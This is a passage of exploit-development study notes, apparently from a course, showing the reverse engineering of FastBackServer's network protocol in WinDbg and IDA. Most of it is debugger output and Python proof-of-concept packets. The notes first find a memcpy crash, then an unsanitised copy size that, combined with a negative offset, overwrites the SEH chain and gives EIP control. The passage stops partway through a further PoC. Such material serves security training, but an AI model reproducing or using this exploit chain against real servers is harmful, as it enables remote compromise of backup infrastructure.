+04ffe49c  41414141 41414141 41414141 41414141
+04ffe4ac  41414141 41414141 41414141 41414141
+04ffe4bc  41414141 00000000 00000000 00000000
+04ffe4cc  00000000 00000000 00000000 00000000
+```
+
+The two instructions (`mov eax, [ebp+10h], sub eax, 30h`)
+
+=> The `size` parameter = Our checksum value (`0x64`) - `0x30`.
+
+From the second argument, we find that the source buffer is our input buffer starting at offset `0x30`.
+
+=> This use of a static offset into the buffer typically indicates a separation between a header and content data.
+
+At this point, we can assume that our packet has the structure:
+
+- 0x00 - 0x04: Checksum DWORD
+- 0x04 - 0x34: Packet header
+- 0x34 - End:  psCommandBuffer
+
+In the next basic block , we find another call to `MEM_S_GetChunk`, which was the allocator used for `psCommandBuffer`.
+
+```nasm
+add     esp,0Ch
+push    offset FastBackServer!FXCLI_IF_sAgentCommandsMemoryPool (0096a5a0)
+call    FastBackServer!MEM_S_GetChunk (0048631b)
+add     esp,4
+mov     dword ptr [ebp-8],eax
+cmp     dword ptr [ebp-8],0
+jnz     FastBackServer!FXCLI_C_ReceiveCommand+0xca (0056a1b9)
+```
+
+Once again, we do not control the allocation size so we can skip stepping into the call.
+
+This time, if `MEM_S_GetChunk` fails, we end up reaching another failure block with the error message:
+
+```
+$SG125471       db 'FXCLI_C_ReceiveCommand: Sorry can',27h,'t allocate psAgentCommand'
+                ; DATA XREF: _FXCLI_C_ReceiveCommand+B9↑o
+                db 0Ah,0
+```
+ 
+=> This buffer is named "`psAgentCommand`".
+
+If the allocation succeeds, this new buffer is used in the next basic block where we find another copy operation through `memcpy`:
+
+```nasm
+push    30h
+mov     eax,dword ptr [ebp+0Ch]
+push    eax
+mov     ecx,dword ptr [ebp-8]
+push    ecx
+call    FastBackServer!memcpy
+add     esp,0Ch
+mov     edx,dword ptr [ebp-8]
+mov     eax,dword ptr [ebp-0Ch]
+mov     dword ptr [edx+2Ch],eax
+mov     ecx,dword ptr [FastBackServer!FXCLI_sMessageQueue]
+push    ecx
+call    FastBackServer!MSGQ_S_GetChunkForMessage
+add     esp,4
+mov     dword ptr [ebp-4],eax
+cmp     dword ptr [ebp-4],0
+jnz     FastBackServer!FXCLI_C_ReceiveCommand+0x101
+```
+ 
+The size of the copy operation is `0x30` bytes, which matches our estimate of the packet header size.
+
+The memory copy starts at the beginning of our input buffer (`move eax, [ebp+0Ch], push eax`).
+
+Update the packet structure with these new buffer names:
+
+- 0x00 - 0x04: Checksum DWORD
+- 0x04 - 0x34: psAgentCommand
+- 0x34 - End:  psCommandBuffer
+
+A call to `MSGQ_S_GetChunkForMessage` is issued after the `mempy` operation. This function does not accept any arguments under our control, so skip it for now.
+
+The next basic block contains a call to the `FXCLI_OraBR_Exec_Command` function.
+
+```nasm
+mov     edx,dword ptr [ebp-4]
+mov     eax,dword ptr [ebp-8]
+mov     dword ptr [edx+0Ch],eax
+mov     ecx,dword ptr [ebp-4]
+mov     edx,dword ptr [ebp+8]
+mov     dword ptr [ecx+4],edx
+mov     eax,dword ptr [ebp-4]
+mov     ecx,dword ptr [ebp+14h]
+mov     dword ptr [eax+8],ecx
+mov     edx,dword ptr [ebp-8]
+mov     eax,dword ptr [ebp+8]
+mov     dword ptr [edx+8],eax
+push    1
+mov     ecx,dword ptr [ebp-4]
+push    ecx
+call    FastBackServer!FXCLI_OraBR_Exec_Command (0056c4b6)
+```
+
+### Reversing the Header
+
+Analyze the` FXCLI_OraBR_Exec_Command` function.
+
+When we attempt to examine this function in IDA Pro, we receive an  error because, by default, IDA Pro will only display functions in `graph` mode with a maximum of `1000` basic blocks or nodes.
+
+`FXCLI_OraBR_Exec_Command` is a very large function.
+
+Increase the maximum number of nodes per function: Navigate to `Options > General` and the `Graph` tab to change the `Max number of nodes` to `10000`.
+ 
+Press `Space` to switch back to `graph` view:
+ 
+- Functions like `FXCLI_OraBR_Exec_Command `are written through a multitude of if, else, and switch statements.
+
+- The evaluation of these conditional statements is commonly based on single or multiple values usually stored in the **packet header**. These values are often referred to **opcodes**.
+
+Generally, when we're reverse engineering to locate vulnerabilities, functions with a huge amount of branches like `FXCLI_OraBR_Exec_Command` are the ones we want to locate and trigger from our network packet.
+
+Reverse engineer the top part of the function to gain a better understanding of how the `psAgentCommand` and `psCommandBuffer` buffers are used.
+
+To easily **trace our input** inside the function, update our PoC so that the `psAgentCommand` section consists of `0x41` bytes and the `psCommandBuffer` section consists of `0x42` bytes
+
+```python
+...
+buf = pack(">i", 0x64)
+buf += bytearray([0x41]*0x30)
+buf += bytearray([0x42]*0x34)
+...
+```
+
+Remove any existing breakpoints, set a breakpoint on `FXCLI_OraBR_Exec_Command`, and send a new packet using our updated PoC:
+
+`bc *`
+
+`bp FastBackServer!FXCLI_OraBR_Exec_Command`
+
+`g`
+
+```
+Breakpoint 0 hit
+FastBackServer!FXCLI_OraBR_Exec_Command:
+0056c4b6 55              push    ebp
+```
+
+The prologue of `FXCLI_OraBR_Exec_Command` is very large, but if we continue to single step through instructions, we will eventually reach a comparison using a DWORD from the `psAgentCommand` header:
+
+```
+eax=062fc890 ecx=062fc880
+FastBackServer!FXCLI_OraBR_Exec_Command+0x375:
+0056c82b 817804a8610000  cmp     dword ptr [eax+4],61A8h ds:0023:062fc894=41414141
+```
+
+`dd eax-20 L10`
+
+```
+062fc870  00000000 00000000 00000000 00000000
+062fc880  41414141 41414141 0d42b020 41414141
+062fc890  41414141 41414141 41414141 41414141
+062fc8a0  41414141 41414141 41414141 072b4c08
+```
+
+This is the `psAgentCommand` buffer because it has our `0x41` bytes.
+
+The comparison (`cmp dword ptr [eax+4],61A8h`) is performed at an offset of `4` from the `EAX` register, which points to `0x062fc890`.
+
+`psAgentCommand` starts at `0x062fc880`
+
+=> The DWORD compared with the static value `61A8h` is located at offset `0x14` from the beginning of the `psAgentCommand` buffer.
+
+Notice that the content of `ECX` originates from `EBP+var_C370` (`ebp-0C370h`):
+
+```nasm
+mov     ecx,dword ptr [ebp-0C370h]
+mov     edx,dword ptr [ecx+2Ch]
+add     edx,4
+mov     dword ptr [ebp-61B0h],edx
+mov     eax,dword ptr [ebp-61B4h]
+cmp     dword ptr [eax+4],61A8h ds:0023:05f4d7f4=41414141
+jnb     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c
+```
+ 
+- `EBP+var_C370` (`ebp-0C370h`) contains the address of the `psAgentCommand` buffer
+
+- `EBP+var_61B4` (`ebp-61B4h`) contains the address of the `psAgentCommand` buffer plus `0x10` bytes.
+
+To ease our reverse engineering, **rename** the `var_C370` to "`psAgentCommand`" and `var_61B4` to "`psAgentCommand_0x10`".
+
+If the subsequent `JNB` (`JAE`) is triggered, the execution leads to a failure statement with the message:
+
+```
+$SG126209       db 'FXCLI_OraBR_Exec_Command: buffer size mismatch, posible buffer ov'
+                ; DATA XREF: _FXCLI_OraBR_Exec_Command+3F7↑o
+                db 'errun attack',0Ah,0
+```
+
+This indicates that this DWORD must < `0x61A8`.
+
+Speed up our reverse engineering process by modifying the compared DWORD in memory to avoid the failure statement.
+
+Change the DWORD to `0x1000`, an arbitrary value smaller than `0x61A8`.
+
+`ed eax+4 1000`
+
+`r`
+
+```
+eax=062fc890
+FastBackServer!FXCLI_OraBR_Exec_Command+0x375:
+0056c82b 817804a8610000  cmp     dword ptr [eax+4],61A8h ds:0023:062fc894=00001000
+```
+
+When the comparison is performed, the conditional jump is not taken.
+
+`p`
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x37c:
+0056c832 731e            jae     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c (0056c852) [br=0]
+```
+
+This kind of comparison between a DWORD in the buffer sent over the network and a static value, combined with the error message, suggests that:
+
+- We are dealing with a length or size parameter.
+
+- `0x61A8` is the upper limit for this parameter.
+
+When we single-step to the next basic block:
+
+```nasm
+mov     ecx, [ebp+psAgentCommand_0x10]
+cmp     dword ptr [ecx+0Ch], 61A8h
+jnb     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c (0056c852)
+```
+ 
+The DWORD at offset `0x1C` in the `psAgentCommand` buffer must also < `0x61A8`.
+
+If we do not trigger the following conditional jump, we arrive at a third, similar check in a different basic block:
+
+```nasm
+mov     edx, [ebp+psAgentCommand_0x10]
+cmp     dword ptr [edx+4], 61A8h
+jb      FastBackServer!FXCLI_OraBR_Exec_Command+0x40f
+```
+ 
+The DWORD at offset `0x14` from the beginning of the `psAgentCommand` buffer must < the static value `0x61A8`.
+
+Manually set the DWORD at offset `0x1C` to an arbitrary value below `0x61A8`. In this case, we choose `0x2000` and, execution continues past the last two comparisons:
+
+`ed ecx+c 2000`
+
+`r`
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x384:
+0056c83a 81790ca8610000  cmp     dword ptr [ecx+0Ch],61A8h ds:0023:062fc89c=00002000
+```
+
+`p`
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x38b:
+0056c841 730f            jae     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c (0056c852) [br=0]
+```
+
+`p`
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x38d:
+0056c843 8b954c9effff    mov     edx,dword ptr [ebp-61B4h] ss:0023:0d739ce4=062fc890
+```
+
+`p`
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x393:
+0056c849 817a04a8610000  cmp     dword ptr [edx+4],61A8h ds:0023:062fc894=00001000
+```
+
+`p`
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x39a:
+0056c850 7273            jb      FastBackServer!FXCLI_OraBR_Exec_Command+0x40f (0056c8c5) [br=1]
+```
+
+The Jump below (`JB`) is going to take us to `loc_56C8C5` in IDA Pro since our value (`0x1000`) < `0x61A8`.
+
+```nasm
+mov     edx, [ebp+psAgentCommand_0x10]
+cmp     dword ptr [edx+4], 0
+jz      FastBackServer!FXCLI_OraBR_Exec_Command+0x454
+```
+
+A comparison between the DWORD we modified at offset `0x14` from the beginning of `psAgentCommand` and `0`.
+
+Since we set this to `0x1000` we are going to pass this check and reach the next basic block
+
+```nasm
+mov     eax, [ebp+psAgentCommand_0x10]
+mov     ecx, [eax+4]
+push    ecx             ; Size
+mov     edx, [ebp+psAgentCommand_0x10]
+mov     eax, [ebp+var_61B0]
+add     eax, [edx]
+push    eax             ; Src
+lea     ecx, [ebp+Dst]
+push    ecx             ; Dst
+call    _memcpy
+add     esp, 0Ch
+mov     edx, [ebp+psAgentCommand_0x10]
+mov     eax, [edx+4]
+mov     [ebp+eax+Dst], 0
+```
+
+This same value is copied to `ECX` and used as the `Size` parameter for the `memcpy` operation.
+
+When C/C++ code is compiled into assembly, `ECX` is commonly used as a counter in string operations.
+
+The `source` buffer parameter is a bit more complicated, analyze it dynamically in the debugger.
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x42b:
+0056c8e1 8b85509effff    mov     eax,dword ptr [ebp-61B0h] ss:0023:0d739ce8=072b4c0c
+```
+
+`p`
+
+```
+eax=072b4c0c edx=062fc890
+FastBackServer!FXCLI_OraBR_Exec_Command+0x431:
+0056c8e7 0302            add     eax,dword ptr [edx]  ds:0023:062fc890=41414141
+```
+
+`dd eax`
+
+```
+072b4c0c  42424242 42424242 42424242 42424242
+072b4c1c  42424242 42424242 42424242 42424242
+072b4c2c  42424242 42424242 42424242 42424242
+072b4c3c  42424242 00000000 00000000 00000000
+072b4c4c  00000000 00000000 00000000 00000000
+072b4c5c  00000000 00000000 00000000 00000000
+072b4c6c  00000000 00000000 00000000 00000000
+072b4c7c  00000000 00000000 00000000 00000000
+```
+
+`dd edx LC`
+
+```
+062fc890  41414141 00001000 41414141 00002000
+062fc8a0  41414141 41414141 41414141 072b4c08
+062fc8b0  26b3980f 081d037f 4c435846 534d5f49
+```
+
+1. `EAX` contains the address of `psCommandBuffer`, our `0x42`'s. => the copy operation will use our input data.
+
+The address of `psCommandBuffer` is stored in the variable `var_61B0` => rename that to "`psCommandBuffer`" inside IDA Pro.
+
+2. The addition operation between the address stored in `EAX` (`psCommandBuffer` address) and the value `EDX` points to. This in effect modifies the starting address within `psCommandBuffer` for the copy operation.
+
+By inspecting the content memory pointed to by `EDX`, we find that this DWORD is located at offset `0x10` from the beginning of our `psAgentCommand` buffer and therefore is under our control.
+
+The copy operation is performed on our input data at an offset we control.
+
+Let's use this to update our packet structure:
+
+- 0x00       : Checksum DWORD
+- 0x04 - 0x30: psAgentCommand
+    - 0x04 - 0x10:  ??
+    - 0x14:         Offset for copy operation
+    - 0x18:         Size of copy operation
+    - 0x1C - 0x30:  ??
+- 0x34 - End:  psCommandBuffer
+
+
+Moving forward, a basic block at address `0x0056C916` where another `memcpy` operation is performed:
+
+```nasm
+mov     edx, [ebp+psAgentCommand_0x10]
+mov     eax, [edx+0Ch]
+push    eax             ; Size
+mov     ecx, [ebp+psAgentCommand_0x10]
+mov     edx, [ebp+psCommandBuffer]
+add     edx, [ecx+8]
+push    edx             ; Src
+lea     eax, [ebp+Src]
+push    eax             ; Dst
+call    _memcpy
+add     esp, 0Ch
+mov     ecx, [ebp+psAgentCommand_0x10]
+mov     edx, [ecx+0Ch]
+mov     [ebp+edx+Src], 0
+```
+ 
+The start of the copy into the source buffer is controlled by a value found at offset `0x18` from the beginning of the `psAgentCommand` buffer.
+
+The size of the copy is still under our control, located at offset `0x1C` in the header.
+
+At address `0x0056C95C`, we find yet another similar basic block containing a `memcpy` operation:
+
+```nasm
+mov     ecx, [ebp+psAgentCommand_0x10]
+mov     edx, [ecx+14h]
+push    edx             ; Size
+mov     eax, [ebp+psAgentCommand_0x10]
+mov     ecx, [ebp+psCommandBuffer]
+add     ecx, [eax+10h]
+push    ecx             ; Src
+lea     edx, [ebp+Source]
+push    edx             ; Dst
+call    _memcpy
+add     esp, 0Ch
+mov     eax, [ebp+psAgentCommand_0x10]
+mov     ecx, [eax+14h]
+mov     [ebp+ecx+Source], 0
+```
+ 
+Our `psCommandBuffer` is again used as the source buffer.
+
+In this case, the start of the copy is controlled by a value found at offset `0x20` from the beginning of the `psAgentCommand` buffer. The size of the copy is found at offset `0x24` in the header.
+
+An updated packet structure based on this information:
+
+- 0x00       : Checksum DWORD
+- 0x04 - 0x30: psAgentCommand
+    - 0x04 - 0x10:  ??
+    - 0x14:         Offset for 1st copy operation
+    - 0x18:         Size of 1st copy operation
+    - 0x1C:         Offset for 2nd copy operation
+    - 0x20:         Size of 2nd copy operation
+    - 0x24:         Offset for 3rd copy operation
+    - 0x28:         Size of 3rd copy operation
+    - 0x2C - 0x30:  ??
+- 0x34 - End:  psCommandBuffer
+
+Inspect execution of the first `memcpy` operation:
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
+0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd esp L3`
+
+```
+0d6de328  0d733b30 486c8d4d 00001000
+```
+
+`dd 486c8d4d`
+
+```
+486c8d4d  ???????? ???????? ???????? ????????
+486c8d5d  ???????? ???????? ???????? ????????
+486c8d6d  ???????? ???????? ???????? ????????
+486c8d7d  ???????? ???????? ???????? ????????
+486c8d8d  ???????? ???????? ???????? ????????
+486c8d9d  ???????? ???????? ???????? ????????
+486c8dad  ???????? ???????? ???????? ????????
+486c8dbd  ???????? ???????? ???????? ????????
+```
+
+`p`
+
+```
+(158.1b54): Access violation - code c0000005 (first chance)
+FastBackServer!memcpy+0x33:
+00666e73 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+```
+
+Notice that the DWORD at offset `0x14` in the `psAgentCommand` buffer, which has the value `0x41414141`, will cause the `memcpy` operation to have an invalid source buffer.
+
+This eventually leads to an invalid address and an access violation when executing the `memcpy`.
+
+We have just found our 1st vulnerability in the application before we even finish examining the protocol. Unfortunately, `memcpy` with an invalid source buffer will only cause a DoS and not enable us to obtain EIP control.
+
+While a DoS vulnerability can be useful in some situations, we want to RCE.
+
+### Exploiting Memcpy
+
+We learned how to trigger an access violation and crash `FastBackServer`.
+
+Uncover a vulnerability that will provide us with full control of `EIP`.
+
+An updated packet structure based on this information:
+
+- 0x00       : Checksum DWORD
+- 0x04 - 0x30: psAgentCommand
+    - 0x04 - 0x10:  ??
+    - 0x14:         Offset for 1st copy operation
+    - 0x18:         Size of 1st copy operation
+    - 0x1C:         Offset for 2nd copy operation
+    - 0x20:         Size of 2nd copy operation
+    - 0x24:         Offset for 3rd copy operation
+    - 0x28:         Size of 3rd copy operation
+    - 0x2C - 0x30:  ??
+- 0x34 - End:  psCommandBuffer
+
+Update our PoC to reflect the structure of the `psAgentCommand` buffer and populate it with values that will not cause an access violation.
+
+```python
+import socket
+import sys
+from struct import pack
+
+# Checksum
+buf = pack(">i", 0x630)
+# psAgentCommand
+buf += bytearray([0x41]*0x10)
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x200)  # 2nd memcpy: size field
+buf += pack("<i", 0x300)  # 3rd memcpy: offset
+buf += pack("<i", 0x300)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += bytearray([0x42]*0x100) # 1st buffer
+buf += bytearray([0x43]*0x200) # 2nd buffer
+buf += bytearray([0x44]*0x300) # 3rd buffer
+...
+```
+
+We have split the `psCommandBuffer` into 3 parts with sizes of `0x100`, `0x200`, and `0x300` bytes, respectively.
+
+The `psAgentCommand` buffer is updated to reflect the correct sizes.
+
+The `memcpy` operations are interesting because we control both the `size` parameter and the `source` data, creating optimal conditions for a memory corruption vulnerability.
+
+Set a breakpoint on the first memcpy call in WinDbg and resend our PoC:
+
+`bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b`
+
+`g`
+
+```
+Breakpoint 0 hit
+FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
+0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd esp L3`
+
+```
+0d4be328  0d513b30 06e9ec0c 00000100
+```
+
+`dd 06e9ec0c`
+
+```
+06e9ec0c  42424242 42424242 42424242 42424242
+06e9ec1c  42424242 42424242 42424242 42424242
+06e9ec2c  42424242 42424242 42424242 42424242
+06e9ec3c  42424242 42424242 42424242 42424242
+06e9ec4c  42424242 42424242 42424242 42424242
+06e9ec5c  42424242 42424242 42424242 42424242
+06e9ec6c  42424242 42424242 42424242 42424242
+06e9ec7c  42424242 42424242 42424242 42424242
+```
+
+The 2nd argument is our `psCommandBuffer` and the 3rd argument is the buffer length that we supply. However, the 1st argument, the destination buffer, is not under our control.
+
+In a typical stack overflow vulnerability, a user-supplied buffer is copied onto the stack and overwrites the return address with a controlled value.
+
+To succeed, 2 conditions need to be satisfied.
+
+1. The destination buffer needs to reside on the stack at an address lower than the **return address**. (If the destination buffer is at a higher address than where the return address is stored, the return address will never be overwritten.)
+
+2. Ensure that the size of the copy is large enough to overwrite the return address.
+
+To check for the first condition, compare the destination address with the upper- and lower-bounds of the stack.
+
+`dd esp L3`
+
+```
+0d4be328  0d513b30 06e9ec0c 00000100
+```
+
+`!teb`
+
+```
+TEB at 0031e000
+    ExceptionList:        0d51ff38
+    StackBase:            0d520000
+    StackLimit:           0d4be000
+    SubSystemTib:         00000000
+    FiberData:            00001e00
+    ArbitraryUserPointer: 00000000
+...
+```
+
+From the `StackLimit` and `StackBase` result, the destination buffer resides on the current thread stack.
+
+Next, check if the destination buffer is located at a lower address than the storage address of the target return address we want to overwrite.
+
+Identify the target function **return address** by dumping the call stack
+
+`k`
+
+```
+ # ChildEBP RetAddr  
+00 0d51fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
+01 0d51feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
+02 0d51fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
+03 0d51ff48 006693e9 FastBackServer!ORABR_Thread+0xef
+04 0d51ff80 76449564 FastBackServer!_beginthreadex+0xf4
+05 0d51ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24
+06 0d51ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b
+07 0d51ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
+```
+
+Locate the **return address storage address**:
+
+`dds 0d51fe98 L2`
+
+```
+0d51fe98  0d51feb4
+0d51fe9c  0056a21f FastBackServer!FXCLI_C_ReceiveCommand+0x130
+```
+
+`? 0d513b30 < 0d51fe9c`
+
+```
+Evaluate expression: 1 = 00000001
+```
+
+=> A return address overwrite is possible if we can copy enough data on the stack.
+
+Calculating the difference between the destination buffer and the return address
+
+`? 0d51fe9c  - 0d513b30`
+
+```
+Evaluate expression: 50028 = 0000c36c
+```
+
+=> We must copy `0xC36C` bytes or more to overwrite the return address, but the maximum value for the `size` parameter in the 1st `memcpy` is set to `0x61A8` bytes.
+
+=> It will not be possible to create a stack buffer overflow condition.
+
+A buffer overflow condition is also not possible for the 2nd `memcpy` operation.
+ 
+For the 3rd `memcpy` operation, the size of the copy is supposed to be specified at offset `0x14` (offset `0x18` from the beginning of the packet).
+
+However, we find that the value compared to the maximum copy size value is at offset `0x4`. This value was used to sanitize the size of the 1st `memcpy` too and it appears to be a **programming mistake**.
+ 
+Additionally, revisiting the basic block that performs the `memcpy` operation:
+
+```nasm
+mov     ecx, [ebp+psAgentCommand_0x10]
+mov     edx, [ecx+14h]
+push    edx             ; Size
+mov     eax, [ebp+psAgentCommand_0x10]
+mov     ecx, [ebp+psCommandBuffer]
+add     ecx, [eax+10h]
+push    ecx             ; Src
+lea     edx, [ebp+Source]
+push    edx             ; Dst
+call    _memcpy
+add     esp, 0Ch
+mov     eax, [ebp+psAgentCommand_0x10]
+mov     ecx, [eax+14h]
+mov     [ebp+ecx+Source], 0
+```
+
+We find that it uses the size given for the 3rd buffer in `psAgentCommand` as expected
+
+Since the sanitization is applied using the wrong header buffer size, there is no restriction put in place for the size of this third memory copy operation.
+
+This `memcpy` uses our input data and an unsanitized size, making the perfect conditions for a stack buffer overflow.
+
+Single stepping to the 3rd `memcpy` operation.
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7:
+0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd esp L3`
+
+```
+0d4be328  0d50d980 06e9ef0c 00000300
+```
+
+`k`
+
+```
+ # ChildEBP RetAddr  
+00 0d51fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
+01 0d51feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
+02 0d51fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
+03 0d51ff48 006693e9 FastBackServer!ORABR_Thread+0xef
+04 0d51ff80 76449564 FastBackServer!_beginthreadex+0xf4
+05 0d51ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24
+06 0d51ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b
+07 0d51ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
+```
+
+`dds 0d51fe98 L2`
+
+```
+0d51fe98  0d51feb4
+0d51fe9c  0056a21f FastBackServer!FXCLI_C_ReceiveCommand+0x130
+```
+
+`? 0d51fe9c - 0d50d980`
+
+```
+Evaluate expression: 75036 = 0001251c
+```
+
+We need a copy size greater than `0x1251C` bytes to overwrite the return address. However, the maximum packet size is `0x4400` bytes.
+
+It's possible to fragment the TCP packets to send more than `0x4400` bytes, but this won't be necessary to exploit this vulnerability.
+
+No checks are ever performed on the **offset** values.
+
+=> supply any value we choose, even if it causes the source buffer address to point outside the `psCommandBuffer`.
+
+If we supply a **negative offset**, the copy operation will use a source buffer address lower than the `psCommandBuffer` one. This copy operation will succeed as long as the memory dereferenced during the copy is allocated.
+
+### Getting EIP Control
+
+We located a programming error in the application that enables us to trigger a `memcpy` operation with an **unsanitized size value**.
+
+Overwrite the target return address by precisely calculating the required offset and size for the overflow.
+
+However, a huge buffer length is required for a successful overflow => we would likely corrupt pointers on the stack that will be used by the target function before returning into the overwritten return address.
+
+=> Even if a direct EIP overwrite is possible, it would require a lot of work.
+
+Perform an even larger copy and attempt to **overwrite the SEH chain** and trigger an exception by writing beyond the end of the stack.
+
+Crafting the third part of the `psCommandBuffer`:
+
+- After a few tests, we found that a `psCommandBuffer` size of `0x2000` bytes is sufficient to overflow the SEH chain with our data.
+
+- For the 1st and 2nd buffers, use a size of `0x1000` bytes to reach the 3rd `memcpy` call, passing the 3 size sanity checks.
+
+- Set the offset values to `0x0` for the first 2 `memcpy` operations to avoid invalid dereferences and DoS conditions.
+
+- Set the 3rd size parameter in the `psAgentCommand` buffer to `0x13000` to trigger the overflow condition (The `size` needs > `0x1251C` bytes).
+
+- To address the issue of the maximum packet size of `0x4400` bytes,  supply a **negative value** for the 3rd offset in the `psAgentCommand` buffer.
+
+- If we supply the value `-0x11000`, the `memcpy` operation will first copy the `0x11000` bytes of memory preceding our `psCommandBuffer`, followed by the first `0x2000` bytes contained in `psCommandBuffer`.
+
+Our updated PoC:
+
+```python
+import socket
+import sys
+from struct import pack
+
+# Checksum
+buf = pack(">i", 0x2330)
+# psAgentCommand
+buf += bytearray([0x41]*0x10)
+buf += pack("<i", 0x0)     # 1st memcpy: offset
+buf += pack("<i", 0x1000)  # 1st memcpy: size field
+buf += pack("<i", 0x0)     # 2nd memcpy: offset
+buf += pack("<i", 0x1000)  # 2nd memcpy: size field
+buf += pack("<i", -0x11000)  # 3rd memcpy: offset
+buf += pack("<i", 0x13000) # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += bytearray([0x45]*0x100) # 1st buffer
+buf += bytearray([0x45]*0x200) # 2nd buffer
+buf += bytearray([0x45]*0x2000) # 3rd buffer
+...
+```
+
+Restarting FastBackServer, attaching WinDbg, and setting a breakpoint on the third `memcpy` at `FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7`.
+
+`bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7`
+
+`g`
+
+```
+Breakpoint 0 hit
+FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7:
+0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd esp L3`
+
+```
+0d21e328  0d26d980 06f01c0c 00013000
+```
+
+`dd 06f01c0c`
+
+```
+06f01c0c  00000000 00000000 00000000 00000000
+06f01c1c  00000000 00000000 00000000 00000000
+06f01c2c  00000000 00000000 00000000 00000000
+06f01c3c  00000000 00000000 00000000 00000000
+06f01c4c  00000000 00000000 00000000 00000000
+06f01c5c  00000000 00000000 00000000 00000000
+06f01c6c  00000000 00000000 00000000 00000000
+06f01c7c  00000000 00000000 00000000 00000000
+```
+
+`dd 06f01c0c + 11000`
+
+```
+06f12c0c  45454545 45454545 45454545 45454545
+06f12c1c  45454545 45454545 45454545 45454545
+06f12c2c  45454545 45454545 45454545 45454545
+06f12c3c  45454545 45454545 45454545 45454545
+06f12c4c  45454545 45454545 45454545 45454545
+06f12c5c  45454545 45454545 45454545 45454545
+06f12c6c  45454545 45454545 45454545 45454545
+06f12c7c  45454545 45454545 45454545 45454545
+```
+
+The source buffer contains null bytes, but at offset `0x11000` into the source buffer, we find our expected `0x45` bytes.
+
+Before stepping over the call to `memcpy`, examine the structured exception handler chain:
+
+`!exchain`
+
+```
+0d27ff38: FastBackServer!_except_handler3+0 (00667de4)
+  CRT scope  1, filter: FastBackServer!ORABR_Thread+fb (0048caa4)
+                func:   FastBackServer!ORABR_Thread+10d (0048cab6)
+0d27ff70: FastBackServer!_except_handler3+0 (00667de4)
+  CRT scope  0, filter: FastBackServer!_beginthreadex+112 (00669407)
+                func:   FastBackServer!_beginthreadex+126 (0066941b)
+0d27ffcc: ntdll!_except_handler4+0 (77307390)
+  CRT scope  0, filter: ntdll!__RtlUserThreadStart+40 (772d2951)
+                func:   ntdll!__RtlUserThreadStart+7c (772d298d)
+0d27ffe4: ntdll!FinalExceptionHandlerPad54+0 (77313c86)
+Invalid exception stack at ffffffff
+```
+
+The SEH chain is complete and valid, as expected.
+
+Step over the `memcpy` operation and dump the SEH chain again:
+
+`p`
+
+```
+(8d8.e90): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=06f14c0c ebx=05feade0 ecx=00000260 edx=00000000 esi=06f1428c edi=0d280000
+eip=00666e73 esp=0d21e318 ebp=0d21e320 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
+FastBackServer!memcpy+0x33:
+00666e73 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+```
+
+`!exchain`
+
+```
+0d27ff38: 45454545
+Invalid exception stack at 45454545
+```
+
+The SEH chain has been overwritten with our data, `0x45454545`.
+
+An access violation has also been triggered, enabling us to invoke the compromised SEH chain by continuing execution.
+
+`g`
+
+```
+(8d8.e90): Access violation - code c0000005 (first chance)
+45454545 ??              ???
+```
+
+We have obtained control of the `EIP`.
+
+## Digging Deeper to Find More Bugs
+
+We located a vulnerability that gives us control of the `EIP` register. 
+
+But keep focusing on reverse engineering to locate another vulnerability.
+
+Dig into the target program's main functionality that can be reached through `FastBackServer!FXCLI_OraBR_Exec_Command`.
+
+Uncover an additional memory corruption through a different type of memory copy operation.
+
+### Switching Execution
+
+Revert our PoC to contain valid values in the `psAgentCommand` buffer, to **avoid** triggering the unsanitized `memcpy` operation vulnerabilities found:
+
+```python
+import socket
+import sys
+from struct import pack
+
+# Checksum
+buf = pack(">i", 0x630)
+# psAgentCommand
+buf += bytearray([0x41]*0x10)
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
